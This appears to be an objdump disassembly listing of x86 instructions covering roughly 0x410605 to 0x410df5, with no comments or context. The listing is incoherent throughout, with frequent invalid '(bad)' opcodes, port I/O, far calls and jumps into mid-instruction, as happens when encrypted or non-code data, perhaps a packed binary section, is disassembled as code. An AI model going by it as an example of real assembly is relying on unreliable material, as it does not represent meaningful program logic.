  410605:	and    al,bh
  410607:	cmp    DWORD PTR [ebx+0x4c],ebp
  41060a:	mov    ?,ebp
  41060c:	repz push ecx
  41060e:	loop   0x4105d3
  410610:	cmp    BYTE PTR [ecx+ebx*8+0x5c],0x63
  410615:	aam    0xb8
  410617:	dec    eax
  410618:	loope  0x41062b
  41061a:	clc    
  41061b:	je     0x410647
  41061d:	cli    
  41061e:	dec    ebx
  41061f:	cmp    BYTE PTR [edx-0x5e087db8],al
  410625:	pop    ebp
  410626:	xor    DWORD PTR [eax-0xcbf07f7],ebp
  41062c:	mov    edi,DWORD PTR [edi-0x11287793]
  410632:	pop    esi
  410633:	cwde   
  410634:	add    BYTE PTR fs:[edi-0x70],al
  410638:	cli    
  410639:	popa   
  41063a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41063b:	rcr    DWORD PTR [ecx+0x1a],1
  41063e:	jns    0x410662
  410640:	or     DWORD PTR [esi],esp
  410642:	hlt    
  410643:	jecxz  0x4105ea
  410645:	add    ah,BYTE PTR [ecx]
  410647:	int3   
  410648:	(bad)  
  410649:	js     0x410653
  41064b:	pop    esi
  41064c:	mov    ecx,0x76490134
  410651:	jl     0x41067b
  410653:	cmp    eax,0x2e9139d7
  410658:	dec    eax
  410659:	call   0x473c:0xdbf43f0c
  410660:	jmp    0x410640
  410662:	jp     0x4106b2
  410664:	(bad)  
  410665:	out    dx,al
  410666:	inc    esi
  410667:	mov    ds:0xb5ce23ca,eax
  41066c:	shr    DWORD PTR [edi],1
  41066e:	out    dx,eax
  41066f:	jbe    0x410676
  410671:	pop    esi
  410672:	fmul   DWORD PTR [ecx-0x51453c5d]
  410678:	lahf   
  410679:	out    dx,al
  41067a:	sbb    BYTE PTR [edi-0x3a],al
  41067d:	int    0x60
  41067f:	arpl   WORD PTR [ebx-0x34],di
  410682:	retf   0x48d6
  410685:	aas    
  410686:	push   ecx
  410687:	cmp    eax,0xf25a41f9
  41068c:	or     DWORD PTR [edx],ecx
  41068e:	cli    
  41068f:	sbb    DWORD PTR [ebx],edi
  410691:	push   cs
  410692:	lock mov eax,DWORD PTR [ebp-0x12]
  410696:	mov    edi,0x63daaa26
  41069b:	(bad)  
  41069c:	mov    dh,0xac
  41069e:	(bad)  
  41069f:	(bad)  
  4106a0:	pop    esi
  4106a1:	out    dx,al
  4106a2:	(bad)  
  4106a3:	jge    0x41070e
  4106a5:	mov    edi,0xf103d286
  4106aa:	cs call 0xc07a:0xcad35ef5
  4106b2:	aaa    
  4106b3:	std    
  4106b4:	in     al,0xd5
  4106b6:	lock cdq 
  4106b8:	pushf  
  4106b9:	mov    ecx,ds
  4106bb:	jbe    0x4106d1
  4106bd:	retf   
  4106be:	mov    ch,0xc1
  4106c0:	jmp    0x6bd3b6b6
  4106c5:	or     al,0x19
  4106c7:	push   edi
  4106c8:	sub    eax,0x1155792f
  4106cd:	in     eax,dx
  4106ce:	out    dx,eax
  4106cf:	mov    cl,0x46
  4106d1:	mov    al,ds:0x3f8c0b4b
  4106d6:	mov    al,0x4b
  4106d8:	push   esi
  4106d9:	(bad)  
  4106da:	ins    BYTE PTR es:[edi],dx
  4106db:	imul   ebp,DWORD PTR [edi],0xffffff8e
  4106de:	fidivr WORD PTR [ebx+ebx*8+0x563e659c]
  4106e5:	fnsave [ecx-0x11]
  4106e8:	cli    
  4106e9:	jb     0x410693
  4106eb:	xchg   esi,eax
  4106ec:	dec    esi
  4106ed:	jle    0x41069b
  4106ef:	mov    bl,0xee
  4106f1:	rcr    BYTE PTR [ebx],1
  4106f3:	pop    ds
  4106f4:	or     esp,DWORD PTR [edx]
  4106f6:	sub    al,0x62
  4106f8:	pop    ss
  4106f9:	adc    BYTE PTR [ebp-0x679a4254],ch
  4106ff:	cmp    DWORD PTR cs:[edx+0x51a0476e],ebx
  410706:	sbb    ebx,DWORD PTR [esi+ebx*8]
  410709:	call   0xd9b4222
  41070e:	bound  ecx,QWORD PTR [eax+0x686bf5a1]
  410714:	jnp    0x41071d
  410716:	xlat   BYTE PTR ds:[ebx]
  410717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410718:	pop    edi
  410719:	imul   esi,DWORD PTR [eax+eax*8],0xfffffffa
  41071d:	leave  
  41071e:	lea    edx,[eax+esi*8+0x78]
  410722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410723:	adc    ebp,DWORD PTR [ebp+0x2627dc86]
  410729:	outs   dx,BYTE PTR ds:[esi]
  41072a:	mov    ah,0xb
  41072c:	jecxz  0x4106e1
  41072e:	xlat   BYTE PTR ds:[ebx]
  41072f:	in     al,dx
  410730:	rol    BYTE PTR [ebx-0x78],cl
  410733:	dec    eax
  410734:	xor    al,0xdd
  410736:	sub    edx,DWORD PTR [ebx-0x6357f6c9]
  41073c:	test   esi,ebx
  41073e:	outs   dx,DWORD PTR ds:[esi]
  41073f:	xor    bh,BYTE PTR [esi]
  410741:	xor    DWORD PTR [ecx],edi
  410743:	sar    DWORD PTR [edi-0x71],cl
  410746:	inc    esi
  410747:	or     cl,BYTE PTR [ecx-0x56]
  41074a:	xor    al,0x67
  41074c:	setae  BYTE PTR [ecx+edx*8-0x7b7df8]
  410754:	or     BYTE PTR [ecx+0x4c],dl
  410757:	pop    ebx
  410758:	dec    edi
  410759:	es pop ecx
  41075b:	jge    0x4107a5
  41075d:	jns    0x41073f
  41075f:	pop    ebx
  410760:	cmp    al,0xef
  410762:	in     al,dx
  410763:	xchg   esi,eax
  410764:	push   esp
  410765:	out    dx,eax
  410766:	pop    edx
  410767:	adc    eax,0xcd568049
  41076c:	je     0x41072a
  41076e:	loope  0x41074a
  410770:	add    BYTE PTR fs:0xa4c3a6ec,ah
  410777:	(bad)  
  410779:	cs pop ss
  41077b:	sub    eax,0x7490c3ca
  410780:	pushf  
  410781:	aad    0xdc
  410783:	and    edi,DWORD PTR [esp+edi*4+0x6166d66]
  41078a:	or     al,0xce
  41078c:	mov    eax,0x63cc9f3e
  410791:	xor    esp,DWORD PTR [ebp-0x78]
  410794:	mov    ecx,0x2d8d3cc4
  410799:	test   al,0xc7
  41079b:	mov    esi,0x6f8db53
  4107a0:	ficom  WORD PTR [ebx+0x650e7cab]
  4107a6:	mov    esp,0xd3bc5ffe
  4107ab:	outs   dx,DWORD PTR ds:[esi]
  4107ac:	xchg   esi,eax
  4107ad:	xchg   ecx,eax
  4107ae:	ror    BYTE PTR [ebx],1
  4107b0:	cli    
  4107b1:	imul   edi,esp,0x29
  4107b4:	or     DWORD PTR [esi+0x5fc5a11],0x38b6c296
  4107be:	fcom   DWORD PTR [ecx+0x91dcf6b]
  4107c4:	sub    ah,BYTE PTR [esi-0x6f]
  4107c7:	popf   
  4107c8:	mov    ch,0x81
  4107ca:	or     BYTE PTR [esi+0x47ed2a4b],ah
  4107d0:	ins    BYTE PTR es:[edi],dx
  4107d1:	mov    BYTE PTR [ecx-0x2167466b],ch
  4107d7:	mov    WORD PTR [edx],gs
  4107d9:	mov    ch,0x4
  4107db:	pop    ds
  4107dc:	sub    bl,dl
  4107de:	or     DWORD PTR [edi+0x55962919],eax
  4107e4:	jge    0x41078b
  4107e6:	cmp    DWORD PTR [ecx-0x77],edi
  4107e9:	out    0xd7,eax
  4107eb:	imul   edi,DWORD PTR [edx]
  4107ee:	xor    DWORD PTR [ebx],ebp
  4107f0:	sbb    eax,0x1ce8c294
  4107f5:	sub    DWORD PTR [ebx+edi*8+0x38fa919a],0xae18fa11
  410800:	mov    ah,0x9e
  410802:	test   DWORD PTR [edi],esi
  410804:	push   esp
  410805:	mov    esp,0x6b1c0d17
  41080a:	jle    0x4107d0
  41080c:	in     eax,0x79
  41080e:	jg     0x4107d1
  410810:	jb     0x4107f7
  410812:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410813:	leave  
  410814:	mov    bh,0xb8
  410816:	and    DWORD PTR fs:[esi+0x6a],ebx
  41081a:	sub    eax,0xce806f48
  41081f:	sbb    DWORD PTR [esi],eax
  410821:	mov    ds:0x1c84caa6,eax
  410826:	rcl    BYTE PTR [ebp-0x485fde0c],0x9c
  41082d:	inc    ebp
  41082e:	pop    eax
  41082f:	aad    0xde
  410831:	arpl   WORD PTR [ebx],cx
  410833:	(bad)  
  410834:	clc    
  410835:	xor    eax,0xc4135782
  41083a:	cmp    BYTE PTR [esi+0x235e42cd],al
  410840:	or     dl,BYTE PTR [ebp-0x2d]
  410843:	mov    dh,0x31
  410845:	push   ebx
  410846:	js     0x4107cb
  410848:	pushw  cs
  41084a:	jnp    0x410828
  41084c:	add    DWORD PTR [esp+edx*8],edx
  41084f:	in     eax,dx
  410850:	outs   dx,BYTE PTR ds:[esi]
  410851:	cs fwait
  410853:	scas   eax,DWORD PTR es:[edi]
  410854:	cmp    eax,0xaeaf6c43
  410859:	iret   
  41085a:	jb     0x4108c1
  41085c:	leave  
  41085d:	adc    DWORD PTR [di-0x2215],ecx
  410862:	and    eax,0x7d2a2695
  410867:	nop
  410868:	dec    edx
  410869:	pusha  
  41086a:	sbb    eax,0x675a8532
  41086f:	mov    ebp,ebx
  410871:	mov    edi,0xc9409fb5
  410876:	pusha  
  410877:	pop    edx
  410878:	stc    
  410879:	repnz imul eax,DWORD PTR [ebx],0xffffff94
  41087d:	jbe    0x41085c
  41087f:	out    dx,al
  410880:	dec    edi
  410881:	inc    esp
  410882:	cmp    edi,ecx
  410884:	push   esp
  410885:	in     al,0x93
  410887:	out    dx,al
  410888:	leave  
  410889:	xchg   edi,eax
  41088a:	daa    
  41088b:	imul   esp,DWORD PTR [eax],0x3
  41088e:	add    BYTE PTR ds:0x2603f0e8,0x76
  410895:	inc    ecx
  410896:	mov    ah,0xc5
  410898:	retf   
  410899:	add    esp,DWORD PTR [edx-0x18]
  41089c:	ret    0x95d
  41089f:	stc    
  4108a0:	jmp    DWORD PTR [edi]
  4108a2:	adc    eax,0x3cf84257
  4108a7:	xor    dh,ah
  4108a9:	addr16 mov eax,ds:0x3bfb
  4108ad:	pop    ds
  4108ae:	stos   DWORD PTR es:[edi],eax
  4108af:	out    0xe9,eax
  4108b1:	(bad)  
  4108b3:	test   DWORD PTR [esi-0x71],edx
  4108b6:	dec    edi
  4108b7:	(bad)  
  4108b8:	sbb    esi,DWORD PTR [ecx+0x52]
  4108bb:	inc    ebx
  4108bc:	pop    edx
  4108bd:	loop   0x41089b
  4108bf:	adc    dh,BYTE PTR [ecx]
  4108c1:	and    esp,0x6f
  4108c4:	in     al,0x12
  4108c6:	into   
  4108c7:	ss sbb eax,0xbbc23d68
  4108cd:	popf   
  4108ce:	push   ecx
  4108cf:	mov    al,ds:0xf3292e80
  4108d4:	or     edx,DWORD PTR [ecx]
  4108d6:	jne    0x410912
  4108d8:	dec    edx
  4108d9:	stos   BYTE PTR es:[edi],al
  4108da:	imul   eax,DWORD PTR [esi+0x75],0xffffffd2
  4108de:	test   DWORD PTR [eax+ebp*2-0x2f],edx
  4108e2:	xchg   ecx,eax
  4108e3:	lods   eax,DWORD PTR ds:[esi]
  4108e4:	repnz lods eax,DWORD PTR ds:[esi]
  4108e6:	mov    dl,0x88
  4108e8:	dec    eax
  4108e9:	dec    ebp
  4108ea:	add    cl,BYTE PTR [ebx-0x1c]
  4108ed:	out    dx,al
  4108ee:	mov    esp,0x54a2ba20
  4108f3:	fidiv  WORD PTR [esp+ecx*4-0xd]
  4108f7:	bound  eax,QWORD PTR [ebp+0x4c3632d0]
  4108fd:	jo     0x41088a
  4108ff:	jg     0x41092b
  410901:	xor    ecx,edx
  410903:	mov    eax,0xe09eefe6
  410908:	enter  0x5dc,0xff
  41090c:	(bad)  
  41090d:	out    dx,al
  41090e:	daa    
  41090f:	fadd   DWORD PTR [ebx+0x2b]
  410912:	and    ah,BYTE PTR [eax+0x25]
  410915:	loope  0x410977
  410917:	mov    WORD PTR [edx+0x7de6ac38],?
  41091d:	pushf  
  41091e:	push   ss
  41091f:	mov    ch,0xd2
  410921:	xchg   esp,eax
  410922:	cmp    dl,BYTE PTR [edi-0x7b]
  410925:	cli    
  410926:	mov    eax,ds:0x957e21f
  41092b:	call   0x6f3c7dc8
  410930:	sahf   
  410931:	push   eax
  410932:	hlt    
  410933:	and    edi,DWORD PTR [edi+esi*4+0x1b]
  410937:	popf   
  410938:	nop
  410939:	xor    ebx,ecx
  41093b:	(bad)  
  41093c:	or     eax,0x9af83f5e
  410941:	std    
  410942:	clc    
  410943:	push   cs
  410944:	(bad)  
  410945:	jg     0x410932
  410947:	mov    ds:0x90bf951e,eax
  41094c:	gs hlt 
  41094e:	cmc    
  41094f:	sub    al,BYTE PTR [ecx+esi*2]
  410952:	scas   al,BYTE PTR es:[edi]
  410953:	xlat   BYTE PTR ds:[ebx]
  410954:	(bad)  
  410955:	xor    edx,DWORD PTR [ebx-0x7f36e013]
  41095b:	leave  
  41095c:	fcom   DWORD PTR [eax-0x5f845feb]
  410962:	inc    edi
  410963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410964:	test   BYTE PTR [ebx],0x5d
  410967:	test   eax,0xe9050ed9
  41096c:	add    al,0xfa
  41096e:	add    eax,0x60e2b3ed
  410973:	je     0x410966
  410975:	pop    eax
  410976:	add    ch,BYTE PTR [ebx]
  410978:	cs adc eax,0xfd2b728d
  41097e:	xchg   edx,eax
  41097f:	mov    edx,DWORD PTR [esi-0x5c78e660]
  410985:	mov    dl,0x41
  410987:	stos   BYTE PTR es:[edi],al
  410988:	mov    BYTE PTR [eax],bl
  41098a:	mov    eax,ds:0x7e0163a6
  41098f:	cmc    
  410990:	adc    eax,0x394d440
  410995:	retf   0x677f
  410998:	sar    DWORD PTR [edx-0x23],0xac
  41099c:	clc    
  41099d:	cmp    DWORD PTR ds:0x440bb078,eax
  4109a3:	test   DWORD PTR [edi+0x41],ebp
  4109a6:	int3   
  4109a7:	shl    BYTE PTR [esi+0x5c7eeaf2],0x56
  4109ae:	scas   al,BYTE PTR es:[edi]
  4109af:	or     DWORD PTR [esi],ecx
  4109b1:	push   cs
  4109b2:	pusha  
  4109b3:	sbb    DWORD PTR [ecx],edx
  4109b5:	xchg   edx,eax
  4109b6:	add    DWORD PTR ds:0x93656894,0x3d7dbee2
  4109c0:	or     al,0xe8
  4109c2:	xlat   BYTE PTR ds:[ebx]
  4109c3:	push   cs
  4109c4:	dec    esi
  4109c5:	mov    ss,eax
  4109c7:	adc    dh,BYTE PTR [esi]
  4109c9:	sti    
  4109ca:	lods   al,BYTE PTR ds:[esi]
  4109cb:	mov    ?,WORD PTR [esi-0x7e136adc]
  4109d1:	and    DWORD PTR [ecx+0x46],eax
  4109d4:	inc    ebp
  4109d5:	jmp    0x9766a6a3
  4109da:	dec    edx
  4109db:	rcl    DWORD PTR [edi-0x57],0x50
  4109df:	pop    ss
  4109e0:	push   ebp
  4109e1:	xor    BYTE PTR [esi+0x3300fb66],cl
  4109e7:	in     al,dx
  4109e8:	mov    ecx,0x77783e4b
  4109ed:	ficomp DWORD PTR [ecx-0x7c]
  4109f0:	sar    ebp,cl
  4109f2:	aad    0x87
  4109f4:	and    BYTE PTR [eax+edi*2-0x7dac17ee],cl
  4109fb:	xor    BYTE PTR [ebx+0x76556861],0xb4
  410a02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a03:	and    DWORD PTR [edi-0x74],ebp
  410a06:	push   cs
  410a07:	inc    ecx
  410a08:	xchg   ecx,eax
  410a09:	sar    BYTE PTR [eax+ecx*4],1
  410a0c:	stos   BYTE PTR es:[edi],al
  410a0d:	mov    dh,0xb8
  410a0f:	inc    esi
  410a10:	test   al,0x35
  410a12:	xor    ch,BYTE PTR [eax+0x404dba76]
  410a18:	sbb    ch,cl
  410a1a:	sti    
  410a1b:	push   eax
  410a1c:	jbe    0x4109f1
  410a1e:	(bad)
  410a21:	scas   eax,DWORD PTR es:[edi]
  410a22:	inc    esp
  410a23:	pop    edx
  410a24:	mov    esp,DWORD PTR [edi+0x39708866]
  410a2a:	add    al,BYTE PTR [ecx+0x78a26140]
  410a30:	out    dx,al
  410a31:	(bad)  
  410a32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a33:	mov    dl,0xc9
  410a35:	inc    ebp
  410a36:	stos   BYTE PTR es:[edi],al
  410a37:	and    BYTE PTR [ecx-0x585859ee],al
  410a3d:	int3   
  410a3e:	inc    esi
  410a3f:	bound  edi,QWORD PTR [edx+0x4fde3d36]
  410a45:	std    
  410a46:	mov    BYTE PTR [edx+0x39],ch
  410a49:	mov    esp,0xff1b24b1
  410a4e:	add    DWORD PTR [edx],eax
  410a50:	jmp    0x4109f5
  410a52:	or     esp,DWORD PTR [eax]
  410a54:	and    esi,DWORD PTR [ebp+eiz*1+0x72]
  410a58:	pop    ecx
  410a59:	sbb    eax,0x10f76fd1
  410a5e:	aad    0x6b
  410a60:	add    edi,DWORD PTR [edx+0x51]
  410a63:	mov    eax,DWORD PTR [edx-0x95be1e4]
  410a69:	lahf   
  410a6a:	xchg   ebp,eax
  410a6b:	mov    dh,0xb1
  410a6d:	cmp    bl,BYTE PTR [edi+0x46cfe69e]
  410a73:	stc    
  410a74:	aad    0x78
  410a76:	dec    ebx
  410a77:	repz daa 
  410a79:	jno    0x410a30
  410a7b:	push   cs
  410a7c:	or     esi,esi
  410a7e:	aaa    
  410a7f:	into   
  410a80:	(bad)  
  410a81:	in     eax,dx
  410a82:	les    esi,FWORD PTR [ebx+0x2b]
  410a85:	iret   
  410a86:	data16 mov ch,0xa6
  410a89:	stos   DWORD PTR es:[edi],eax
  410a8a:	jns    0x410a9b
  410a8c:	or     BYTE PTR [edx],dh
  410a8e:	int    0x3e
  410a90:	(bad)
  410a93:	xchg   ebx,eax
  410a94:	aam    0x37
  410a96:	pop    eax
  410a97:	fwait
  410a98:	and    edx,edi
  410a9a:	ret    
  410a9b:	retf   
  410a9c:	and    DWORD PTR [eax-0x5a8c1dbb],eax
  410aa2:	ins    BYTE PTR es:[edi],dx
  410aa3:	div    edi
  410aa5:	leave  
  410aa6:	jne    0x410aa2
  410aa8:	sar    BYTE PTR [ecx-0x380af6e0],cl
  410aae:	sub    eax,0x5fc2c54d
  410ab3:	sbb    al,0xe3
  410ab5:	into   
  410ab6:	and    cl,ah
  410ab8:	push   esi
  410ab9:	clc    
  410aba:	sahf   
  410abb:	outs   dx,BYTE PTR ds:[esi]
  410abc:	xor    eax,0x946e5097
  410ac1:	in     al,0x7
  410ac3:	outs   dx,DWORD PTR ds:[esi]
  410ac4:	ret    0xcdf
  410ac7:	adc    eax,0x8707b53a
  410acc:	sbb    ah,BYTE PTR [ebx+esi*1-0x75dccc4d]
  410ad3:	cmp    BYTE PTR [esi-0x1a3c724c],al
  410ad9:	xor    bl,BYTE PTR [edx]
  410adb:	xor    DWORD PTR [edi+0x503b676f],ecx
  410ae1:	mul    BYTE PTR [ebx+0x3c]
  410ae4:	pop    es
  410ae5:	push   0x8115c545
  410aea:	add    dh,BYTE PTR [ecx+0x4bd6323f]
  410af0:	xor    dh,BYTE PTR [edi]
  410af2:	pop    edi
  410af3:	add    eax,0xfc46fcd8
  410af8:	pmullw mm2,QWORD PTR [edi]
  410afb:	sub    DWORD PTR [edx],0xffffff88
  410afe:	jge    0x410ab9
  410b00:	mov    ebx,0x2add236a
  410b05:	enter  0x140f,0xba
  410b09:	pop    ecx
  410b0a:	xor    DWORD PTR [esi-0x4f],edi
  410b0d:	cmc    
  410b0e:	mov    ds:0xdc3c4a5a,al
  410b13:	lds    esi,FWORD PTR [edx+ecx*4+0x6c]
  410b17:	jo     0x410ab5
  410b19:	sti    
  410b1a:	xor    edi,ebp
  410b1c:	cmp    al,0xd1
  410b1e:	(bad)  
  410b1f:	sbb    DWORD PTR [edi+0x6452985c],esp
  410b25:	out    0x41,al
  410b27:	cmc    
  410b28:	ja     0x410ae1
  410b2a:	nop
  410b2b:	adc    al,0x79
  410b2d:	ret    0xfbf2
  410b30:	xor    BYTE PTR [ecx-0x161ba7f5],0x86
  410b37:	cmp    al,0x42
  410b39:	setns  BYTE PTR [ecx-0x4d1c5a91]
  410b40:	xor    BYTE PTR [ebp-0x29871448],al
  410b46:	mov    esi,0xce8b2454
  410b4b:	mov    ebp,0x1ff9b7b
  410b50:	cli    
  410b51:	mov    ebp,0x9086b032
  410b56:	sar    ecx,cl
  410b58:	ret    0xb66f
  410b5b:	and    cx,WORD PTR [edx+0x7a]
  410b5f:	and    cl,BYTE PTR [ecx]
  410b61:	mov    DWORD PTR [ecx+0x44],0x3d88f3cd
  410b68:	mov    eax,ds:0x53a9c8a7
  410b6d:	sub    DWORD PTR [ebx-0xa985c0d],ecx
  410b73:	add    al,0x81
  410b75:	ss scas al,BYTE PTR es:[edi]
  410b77:	xchg   DWORD PTR [eax+0x6c353c72],edx
  410b7d:	(bad)  
  410b7e:	adc    eax,0xb0036477
  410b83:	jo     0x410b7c
  410b85:	inc    eax
  410b86:	xor    ebx,ecx
  410b88:	mov    edi,0xb3d26a4a
  410b8d:	add    DWORD PTR ds:0x7119b197,ebp
  410b93:	xor    eax,0x5c8bf0e3
  410b98:	and    BYTE PTR [ebx-0x6773894b],al
  410b9e:	pop    esi
  410b9f:	ins    DWORD PTR es:[edi],dx
  410ba0:	lahf   
  410ba1:	jno    0x410b3d
  410ba3:	(bad)
  410ba6:	xlat   BYTE PTR ds:[ebx]
  410ba7:	repnz pop ecx
  410ba9:	cld    
  410baa:	or     dh,0xf6
  410bad:	xor    cl,ch
  410baf:	inc    edx
  410bb0:	call   0x6dc85d47
  410bb5:	(bad)  
  410bb6:	jmp    0x410b3c
  410bb8:	sti    
  410bb9:	push   0xfffffff5
  410bbb:	mov    eax,ds:0xd3a73bfb
  410bc0:	jge    0x410bbc
  410bc2:	addr16 gs or ecx,0x13a2111d
  410bca:	ja     0x410bb3
  410bcc:	fwait
  410bcd:	mov    ebx,0x98e85e44
  410bd2:	out    dx,eax
  410bd3:	addr16 push ecx
  410bd5:	pushf  
  410bd6:	inc    ecx
  410bd7:	iret   
  410bd8:	lea    ebp,[edx-0x77535f8f]
  410bde:	bound  edi,QWORD PTR [ebx]
  410be0:	jge    0x410c4a
  410be2:	cwde   
  410be3:	mov    eax,0x5778b0bc
  410be8:	ds ret 0xcaec
  410bec:	cmp    BYTE PTR [esi+ebp*8],bl
  410bef:	push   es
  410bf0:	(bad)  
  410bf1:	xchg   ebx,eax
  410bf2:	rcl    DWORD PTR [edi],cl
  410bf4:	inc    esi
  410bf5:	cmp    DWORD PTR ds:0xbfd49317,edi
  410bfb:	jnp    0x410c2a
  410bfd:	aad    0x9e
  410bff:	or     al,0xe
  410c01:	call   0xb7e:0xd3406c17
  410c08:	adc    BYTE PTR [edi-0x65e41669],dh
  410c0e:	aas    
  410c0f:	mov    ebp,0xec98a41a
  410c14:	popf   
  410c15:	shr    DWORD PTR [edi],1
  410c17:	add    eax,0xc1dfd01a
  410c1c:	push   edx
  410c1d:	out    dx,eax
  410c1e:	(bad)  
  410c1f:	xchg   edi,eax
  410c20:	(bad)  
  410c22:	inc    edi
  410c23:	mov    DWORD PTR [ecx+0x16],ecx
  410c26:	xor    edi,DWORD PTR [ebp+0x79b06216]
  410c2c:	das    
  410c2d:	sbb    al,0x65
  410c2f:	loopne 0x410c94
  410c31:	ins    DWORD PTR es:[edi],dx
  410c32:	pop    ebp
  410c33:	xor    DWORD PTR [eax],0x8adeb4df
  410c39:	pop    ebx
  410c3a:	xchg   ecx,eax
  410c3b:	xchg   DWORD PTR [ebx+0x789fbe9f],edx
  410c41:	mov    eax,0x98e2e6a4
  410c46:	pusha  
  410c47:	dec    ebx
  410c49:	sub    BYTE PTR [edx],al
  410c4b:	lds    esi,FWORD PTR [ebx]
  410c4d:	scas   eax,DWORD PTR es:[edi]
  410c4e:	lds    esi,FWORD PTR [ebx]
  410c50:	mov    al,ds:0x80541109
  410c55:	cmc    
  410c56:	and    esi,DWORD PTR [esi-0x72cbe39d]
  410c5c:	adc    al,0x76
  410c5e:	and    sp,WORD PTR [eax-0xafbf9a4]
  410c65:	cs cld 
  410c67:	pusha  
  410c68:	sbb    eax,0x573ff4a2
  410c6d:	sub    al,0xec
  410c6f:	rcr    DWORD PTR [ebx-0x2514c6a0],0xba
  410c76:	inc    BYTE PTR [ebx-0x24]
  410c79:	mov    ah,0x78
  410c7b:	leave  
  410c7c:	mov    ecx,0x9a15a276
  410c81:	pop    ecx
  410c82:	mov    ecx,0xfb4ff579
  410c87:	shr    BYTE PTR [edx+0x34b64d6d],cl
  410c8d:	mov    ?,WORD PTR [ecx]
  410c8f:	jne    0x410cc1
  410c91:	add    esp,DWORD PTR [eax]
  410c93:	pop    eax
  410c94:	call   0x1e40:0x64b1a5eb
  410c9b:	test   al,0x3f
  410c9d:	mov    al,0xfc
  410c9f:	or     edi,DWORD PTR [ebx]
  410ca1:	stos   DWORD PTR es:[edi],eax
  410ca2:	xor    eax,0x4f9ed80f
  410ca7:	mov    WORD PTR [eax+0x627e61d3],?
  410cad:	mov    esi,0x4bd3c637
  410cb2:	(bad)  
  410cb3:	cld    
  410cb4:	jb     0x410d05
  410cb6:	mov    bl,0xa3
  410cb8:	jo     0x410cb1
  410cba:	dec    esp
  410cbb:	scas   eax,DWORD PTR es:[edi]
  410cbc:	test   al,0x4b
  410cbe:	add    edi,DWORD PTR [edi]
  410cc0:	dec    ecx
  410cc1:	mov    ch,0x49
  410cc3:	push   ecx
  410cc4:	pop    edx
  410cc5:	es pop es
  410cc7:	or     al,0x53
  410cc9:	adc    cl,bl
  410ccb:	cmc    
  410ccc:	fs stos DWORD PTR es:[edi],eax
  410cce:	mov    eax,ds:0x3f7031e8
  410cd3:	jl     0x410ce4
  410cd5:	push   0x81d7f920
  410cda:	fsubr  DWORD PTR [eax-0x4344db72]
  410ce0:	repnz mov ebp,0x8eb1137e
  410ce6:	xchg   edi,eax
  410ce7:	add    dh,BYTE PTR [ebx-0x6c]
  410cea:	push   esi
  410ceb:	dec    ebp
  410cec:	jne    0x410cdf
  410cee:	shr    BYTE PTR [ecx+ecx*1+0x2],cl
  410cf2:	sub    DWORD PTR [edx-0x4a],0xffffffca
  410cf6:	push   ecx
  410cf7:	lahf   
  410cf8:	and    eax,0x5df530ac
  410cfd:	and    BYTE PTR [edi+0x1e9f6a7],ch
  410d03:	in     al,0x65
  410d05:	lahf   
  410d06:	sti    
  410d07:	ins    DWORD PTR es:[edi],dx
  410d08:	push   esp
  410d09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d0a:	mov    al,ds:0xe78ea78
  410d0f:	xchg   edx,eax
  410d10:	ror    BYTE PTR cs:[ebp+0x47a11d73],0x56
  410d18:	imul   esp,ebx,0x82d02974
  410d1e:	imul   ecx,DWORD PTR [eax+0x62f7ab25],0xffffffee
  410d25:	js     0x410d43
  410d27:	pop    DWORD PTR [eax+ebx*8+0x68]
  410d2b:	int    0xe3
  410d2d:	into   
  410d2e:	cli    
  410d2f:	sub    esi,DWORD PTR [eax+0x63a430de]
  410d35:	mov    fs,WORD PTR [ecx+edi*1-0x7]
  410d39:	jg     0x410d8e
  410d3b:	push   ds
  410d3c:	aad    0x22
  410d3e:	mov    ds:0x683dbe05,al
  410d43:	test   al,0x89
  410d45:	int    0x28
  410d47:	repnz mov ah,0x96
  410d4a:	fs fwait
  410d4c:	les    eax,FWORD PTR [edx+0x3106dae0]
  410d52:	cmc    
  410d53:	call   0x9639d41f
  410d58:	outs   dx,DWORD PTR ds:[esi]
  410d59:	jmp    0x3cbc074b
  410d5e:	sub    cl,0x88
  410d61:	xchg   edx,eax
  410d62:	push   edx
  410d63:	add    DWORD PTR [ebx],ebp
  410d65:	cmp    al,0x91
  410d67:	mov    bh,BYTE PTR [esi-0x25]
  410d6a:	aad    0x4a
  410d6c:	pop    ebp
  410d6d:	(bad)  
  410d6e:	clc    
  410d6f:	mov    eax,ebp
  410d71:	leave  
  410d72:	push   edx
  410d73:	jecxz  0x410ddf
  410d75:	imul   edi,DWORD PTR [ebx-0x6c],0x3d76c0d4
  410d7c:	xchg   esp,eax
  410d7d:	push   esp
  410d7e:	mov    ecx,0x476ce382
  410d83:	lahf   
  410d84:	loop   0x410df6
  410d86:	loope  0x410d25
  410d88:	frstor [edi+0x69156384]
  410d8e:	fsubr  DWORD PTR [esi-0x118a6c16]
  410d94:	out    0xe3,eax
  410d96:	in     eax,dx
  410d97:	(bad)  
  410d98:	mov    dh,0xf4
  410d9a:	jmp    0x410d99
  410d9c:	pop    ds
  410d9d:	sub    BYTE PTR [edi],dl
  410d9f:	ds dec eax
  410da1:	mov    eax,cs:0x5704978c
  410da7:	jp     0x410dca
  410da9:	xchg   edi,eax
  410daa:	imul   ecx,DWORD PTR [esi+0x4cf25888],0x63
  410db1:	addr16 xchg edx,eax
  410db3:	or     eax,0x8862a737
  410db8:	pusha  
  410db9:	dec    ebx
  410dba:	mov    eax,0x8272cf8f
  410dbf:	fstp   DWORD PTR [edi-0x1a]
  410dc2:	pop    ebx
  410dc3:	sbb    DWORD PTR [esp+ecx*8],eax
  410dc6:	sub    al,BYTE PTR [esi+0x51]
  410dc9:	push   edi
  410dca:	and    eax,0xe0e9f04f
  410dcf:	out    dx,eax
  410dd0:	sub    DWORD PTR [edi+0x73],0x63
  410dd4:	leave  
  410dd5:	call   0xef7d:0xdb3f9266
  410ddc:	mov    ah,0xdf
  410dde:	scas   eax,DWORD PTR es:[edi]
  410ddf:	mov    ecx,0x1c52d863
  410de4:	push   esp
  410de5:	fsub   QWORD PTR [edx]
  410de7:	in     al,0xbd
  410de9:	jmp    0x36fc:0xc5bcf867
  410df0:	stc    
  410df1:	mov    esi,ss
  410df3:	loop   0x410e39
  410df5:	cwde   
